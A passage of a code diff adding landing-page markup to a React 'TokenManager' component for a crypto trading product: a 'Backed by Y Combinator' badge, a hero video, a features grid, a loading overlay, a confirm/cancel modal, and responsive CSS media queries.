+            <span className="backed-text">Backed by</span>
+            <div className="combinator-logo" style={{ display: 'flex', alignItems: 'center', gap: '0.25rem' }}>
+              <div className="combinator-icon" style={{ width: '24px', height: '24px', backgroundColor: '#fff', color: '#000', borderRadius: '4px', display: 'flex', justifyContent: 'center', alignItems: 'center', fontWeight: 'bold', fontSize: '18px' }}>
+                Y
+              </div>
+              <span className="combinator-text" style={{ fontWeight: 600 }}>Combinator</span>
+            </div>
+          </div>
+        </section>
+
+        <section style={{ width: '100%' }}>
+          <video style={{ width: '100%' }} src="media/hero-video.mp4" autoPlay loop muted playsInline />
+        </section>
+
+        <div className="trading-features-section" style={{ padding: '4rem 2rem', backgroundColor: '#0a0a0a' }}>
+          <div className="container" style={{ maxWidth: '1200px', margin: '0 auto' }}>
+            <div className="header-content" style={{ textAlign: 'center', marginBottom: '3rem' }}>
+              <h1 className="main-title" style={{ color: '#fff', fontSize: '2.5rem', fontWeight: 700, lineHeight: 1.2, marginBottom: '1rem' }}>
+                Advanced Features to<br />videoline Your Trading.
+              </h1>
+              <p className="subtitle" style={{ color: '#ccc', fontSize: '1.2rem' }}>From wallet tracking to real-time analytics, we've got you covered.</p>
+            </div>
+
+            <div className="features-grid" style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))', gap: '2rem' }}>
+              <div className="feature-item active" style={{ padding: '1.5rem', backgroundColor: '#111', borderRadius: '12px', border: '1px solid #222', position: 'relative' }}>
+                <div className="feature-line" style={{ position: 'absolute', top: 0, left: 0, height: '100%', width: '4px', backgroundColor: '#0070f3' }} />
+                <h3 className="feature-title" style={{ color: '#fff', fontSize: '1.2rem', marginBottom: '0.5rem' }}>Order Execution Engine</h3>
+                <p className="feature-description" style={{ color: '#888' }}>Trade with confidence.</p>
+              </div>
+
+              <div className="feature-item" style={{ padding: '1.5rem', backgroundColor: '#111', borderRadius: '12px', border: '1px solid', position: 'relative' }}>
+                <div className="feature-line" style={{ position: 'absolute', top: 0, left: 0, height: '100%', width: '4px', backgroundColor: '#333' }} />
+                <h3 className="feature-title" style={{ color: '#fff', fontSize: '1.2rem', marginBottom: '0.5rem' }}>Wallet and Twitter Tracker</h3>
+                <p className="feature-description" style={{ color: '#888' }}>Trade and track all in one place.</p>
+              </div>
+
+              <div className="feature-item" style={{ padding: '1.5rem', backgroundColor: '#111', borderRadius: '12px', border: '1px solid #222', position: 'relative' }}>
+                <div className="feature-line" style={{ position: 'absolute', top: 0, left: 0, height: '100%', width: '4px', backgroundColor: '#333' }} />
+                <h3 className="feature-title" style={{ color: '#fff', fontSize: '1.2rem', marginBottom: '0.5rem' }}>Hyperliquid Perpetuals</h3>
+                <p className="feature-description" style={{ color: '#888' }}>Trade leveraged Perps.</p>
+              </div>
+
+              <div className="feature-item" style={{ padding: '1.5rem', backgroundColor: '#111', borderRadius: '12px', border: '1px solid #222', position: 'relative' }}>
+                <div className="feature-line" style={{ position: 'absolute', top: 0, left: 0, height: '100%', width: '4px', backgroundColor: '#333' }} />
+                <h3 className="feature-title" style={{ color: '#fff', fontSize: '1.2rem', marginBottom: '0.5rem' }}>Yield</h3>
+                <p className="feature-description" style={{ color: '#888' }}>Earn while you sleep.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </main>
+
+      {(isLoading || showProcessingModal) && !showModal && (
+        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0, 0, 0, 0.8)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 1000 }}>
+          <div style={{ width: '50px', height: '50px', border: '5px solid #f3f3f3', borderTop: '5px solid #0070f3', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
+        </div>
+      )}
+
+      {showModal && (
+        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0, 0, 0, 0.8)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 2000 }}>
+          <div style={{ backgroundColor: '#222', padding: '2rem', borderRadius: '12px', maxWidth: '500px', width: '90%', boxShadow: '0 10px 25px rgba(0, 0, 0, 0.5)' }}>
+            <h2 style={{ color: modalContent.type === 'error' ? '#ff6b6b' : modalContent.type === 'success' ? '#4ecdc4' : '#fff', marginTop: 0, fontSize: '1.5rem', marginBottom: '1rem' }}>
+              {modalContent.title}
+            </h2>
+            <p style={{ color: '#ccc', fontSize: '1rem', lineHeight: '1.5', marginBottom: '2rem' }}>{modalContent.message}</p>
+            <div style={{ display: 'flex', justifyContent: modalContent.showCancel ? 'space-between' : 'flex-end', gap: '1rem' }}>
+              {modalContent.showCancel && (
+                <button onClick={() => { setShowModal(false); modalContent.onCancel && modalContent.onCancel() }} style={{ padding: '0.75rem 1.5rem', backgroundColor: 'transparent', color: '#fff', border: '1px solid #555', borderRadius: '8px', cursor: 'pointer', fontSize: '1rem', fontWeight: '500' }}>
+                  Cancel
+                </button>
+              )}
+              <button onClick={() => { setShowModal(false); modalContent.onConfirm && modalContent.onConfirm() }} style={{ padding: '0.75rem 1.5rem', backgroundColor: modalContent.type === 'error' ? '#ff6b6b' : modalContent.type === 'success' ? '#4ecdc4' : '#0070f3', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer', fontSize: '1rem', fontWeight: '500' }}>
+                {modalContent.confirmText}
+              </button>
+            </div>
+          </div>
         </div>
       )}
 
@@ -653,6 +868,17 @@ export default function TokenManager(): React.JSX.Element {
         @keyframes spin {
           0% { transform: rotate(0deg); }
           100% { transform: rotate(360deg); }
+        }
+
+        /* Media query para dispositivos móviles */
+        @media (max-width: 768px) {
+          .responsive-logo { width: 20% !important; max-width: 100px !important; min-width: 70px !important; }
+        }
+
+        /* Media query para dispositivos muy pequeños */
+        @media (max-width: 480px) {
+          .responsive-logo { width: 25% !important; max-width: 90px !important; min-width: 60px !important; }
+          .navbar { padding: 1rem !important; }
         }
       `}</style>
     </div>
